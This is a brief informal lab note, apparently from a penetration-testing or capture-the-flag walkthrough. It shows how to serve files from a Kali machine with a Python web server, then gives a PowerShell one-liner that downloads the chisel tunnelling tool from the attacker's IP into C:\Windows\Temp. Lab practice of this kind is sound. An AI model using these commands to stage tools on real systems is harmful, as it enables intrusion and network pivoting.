In the kali , just start a python server serving the dir in which the file is present, then just connect back from powershell:
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.1x.x:8000/chisel.exe', 'C:\Windows\Temp\chisel.exe')
```

if u wanna test if got downloaded u do this:
```powershell
Test-Path C:\Windows\Temp\chisel.exe
```
